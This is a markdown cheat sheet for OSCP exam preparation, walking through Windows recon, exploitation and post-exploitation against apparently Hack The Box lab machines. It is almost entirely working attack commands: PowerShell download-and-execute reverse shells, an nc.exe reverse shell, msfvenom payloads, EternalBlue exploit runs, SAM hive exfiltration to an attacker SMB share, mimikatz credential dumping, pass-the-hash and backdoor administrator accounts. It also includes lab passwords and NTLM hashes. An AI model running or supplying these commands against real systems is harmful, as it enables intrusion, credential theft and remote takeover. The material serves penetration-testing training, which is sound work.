# OSCP Cheat Sheets Windows
Preparation for OSCP

## RECON

#### Fireall
```Shell
netsh advfirewall firewall add rule name="SMB" protocol=TCP dir=in localport=445 action=allow
netsh advfirewall firewall add rule name="SMB" protocol=TCP dir=out localport=445 action=allow
```


#### SMB
```Shell
nmap -Pn -sT -n --script smb-enum-shares.nse  10.10.10.40 -p 135,139,445
```
```Shell
smbclient -L 10.10.10.40 -N 
smbclient //10.10.10.40/Users -N
smbclient -L 10.10.10.125 -N 2>/dev/null | grep "Disk" | awk '{print $1}' | while read shared; do echo "${shared} - "; smbclient -N //10.10.10.125/${shared} -c 'dir'; echo; done 
```
```Shell
smbmap -H 10.10.10.40 -u ''
```
```Shell
mkdir smbFolder
mount -t cifs //10.10.10.40/Users /tmp/smbFolder -o username=null,password=null,domain=WORKGROUP,rw
```
```Shell
smbcacls //10.10.10.40/Users Admin/Desktop -N
smbcacls //10.10.10.40/Users Admin/Desktop -N | grep Everyone
```

#### Transer file

```Shell
root@kali:/OSCPv3/htb/Optimum# python -m SimpleHTTPServer 80
PS C:\Users\kostas\Desktop> certutil.exe -f -urlcache -split http://10.10.14.2/bfill.exe bfill.exe
```
```Shell
root@kali:/OSCPv3/htb/Optimum# python -m SimpleHTTPServer 80
C:\Users\kostas\Desktop>powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.2/bfill.exe','C:\Users\kostas\Desktop\bfill-2.exe')"
```
```Shell
root@kali:/OSCPv3/htb/Optimum# python -m SimpleHTTPServer 80
powershell Invoke-WebRequest "http://10.10.14.2/bfill.exe" -OutFile "C:\Users\kostas\Desktop\bfill-3.exe"
```
```Shell
root@kali:/OSCPv3/htb/Optimum# impacket-smbserver folder $(pwd)
copy \\10.10.14.2\folder\bfill.exe C:\Users\kostas\Desktop\exploit.exe

#C:\Users\kostas\Desktop>powershell -c "New-PSDrive -Name 'SharedFolder' -PSProvider 'FileSystem' -Root '\\10.10.14.2\folder'"
#C:\Users\kostas\Desktop>copy SharedFolder:\bfill.exe C:\Users\kostas\Desktop\exploit.exe
```


## Vulnerability Discovery

```Shell
nmap -Pn -sT -n --script "vuln and safe" 10.10.10.40 -p 135,139,445
```

```Shell
searchsploit eternalblue
searchsploit -x 42315
searchsploit -m 42315
```

## Explotation


#### SQL
```Shell
sqsh -S 10.10.10.125 -U 'sa'
```
```Shell
sqsh -S 10.10.10.125 -U 'sa'
```
/usr/share/doc/python-impacket/examples/mssqlclient.py WORKGROUP/reporting:PcwTWTHRwryjc\$c6@10.10.10.125 -db volume  -windows-auth

#### Shells
```Shell
root@kali:/OSCPv3/htb/Optimum# python -m SimpleHTTPServer 80
10.10.10.8 - - [12/Jan/2022 21:58:35] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```
```Shell
C:\Users\kostas\Desktop>start /b C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 443
C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 443
```
```Shell
PS C:\> [Environment]::Is64BitOperatingSystem
PS C:\> [Environment]::Is64BitProcess
```

#### Crack
#Pwd NetNTLM
```Shell
root@kali:/OSCPv3/htb/Optimum# cat hash 
kostas::OPTIMUM:4141414141414141:cb75e848816d72f0887c979360a94c8d:01010000000000008049ffc23c08d801d13ac8046c9c0773000000000100100062004f0056006c004c006300560043000200100053005100730044004600540044004f000300100062004f0056006c004c006300560043000400100053005100730044004600540044004f00070008008049ffc23c08d80106000400020000000800300030000000000000000000000000200000427ee1a135839f2e7cdb03560c68c4af3fd234632cc4c0ce7480b21dc9de2fb40a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003200000000000000000000000000
```
```Shell
root@kali:/OSCPv3/htb/Optimum# john --wordlist=pwd.txt hash_impacket_smb 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/32])
Press 'q' or Ctrl-C to abort, almost any other key for status
kdeEjDowkS*      (kostas)
1g 0:00:00:00 DONE (2022-01-12 23:21) 100.0g/s 100.0p/s 100.0c/s 100.0C/s kdeEjDowkS*
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```


#### Eternalblue
```Shell
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py -O mysmb.py
python 42315.py 10.10.10.40
```

```Shell
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o exploit.exe EXITFUNC=thread LHOST=10.10.14.28 LPORT=4444
python 42315.py 10.10.10.40 samr exploit.exe 
```

```Shell
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
python eternal_checker.py 10.10.10.40

./shell_prep.sh 
python eternalblue_exploit7.py 10.10.10.40 sc_x64.bin 

msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.28 LPORT=4444
python eternalblue_exploit7.py 10.10.10.40 sc_x64_msf.bin
```



## Post Explotation

#### Windows Users
```Shell
net users
net user admin admin /add
net localgroup administrators
net localgroup administrators admin /add
net localgroup "Remote Desktop Users" admin /add
```

#### Crackmapexec
```Shell
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' -x 'whoami'
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' --sam
crackmapexec smb 10.10.10.40 -u 'Administrator' -H cdf51b162460b7d5bc898f493751a0cc -x 'whoami'
crackmapexec smb 10.10.10.40 -u 'Administrator' -H cdf51b162460b7d5bc898f493751a0cc -M mimikatz -o COMMAND="privilege::debug token::elevate sekurlsa::logonpasswords exit"
crackmapexec smb 10.10.10.40 -u 'admin' -p 'kdeEjDowkS*' -x '\\10.10.14.2\smbfolder\nc.exe -e cmd 10.10.14.2 4444'
```

#### Windows SAM
```Shell
reg save HKLM\SAM sam.backup
reg save HKLM\SYSTEM system.backup

impacket-smbserver smbfolder $(pwd)
copy sam.backup \\10.10.14.28\smbfolder\sam
copy system.backup \\10.10.14.28\smbfolder\system

pwdump system sam 
```

#### Windows psexec
```Shell
#reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
#user with admin priv
python /opt/impacket/examples/psexec.py WORKGROUP/admin:admin\@10.10.10.40 cmd.exe
python /usr/share/doc/python-impacket/examples/psexec.py WORKGROUP/kostas:kdeEjDowkS*@10.10.10.8 cmd.exe
```

#### Pass-The-Hash
```Shell
pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:d90b270062e8b9f118ab8e0f733df391 //10.10.10.8 cmd.exe
```

## Priv
https://github.com/SecWiki/windows-kernel-exploits

#PowerUp.ps1
```Shell
PS C:\Users\kostas\Desktop> IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/PowerUp.ps1');Invoke-AllChecks;
```
#Wesng
https://github.com/bitsadmin/wesng
```Shell
root@kali:/OSCPv3/htb/Optimum# python /opt/wesng/wes.py systeminfo.txt
root@kali:/OSCPv3/htb/Optimum# python /opt/wesng/wes.py systeminfo.txt -i "Elevation Privilege"
```

#Windows-Exploit-Suggester
https://github.com/AonCyberLabs/Windows-Exploit-Suggester
```Shell
root@kali:/OSCPv3/htb/Optimum# python windows-exploit-suggester.py --update
root@kali:/OSCPv3/htb/Optimum# python windows-exploit-suggester.py --database 2022-01-12-mssb.xls  --systeminfo systeminfo.txt
```

#### MS16-098 - CVE-2016-3309 - Microsoft Windows 8.1 (x64) - 'RGNOBJ' Integer Overflow
https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-098/bfill.exe

#### MS16-032 - CVE-2016-0099 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032

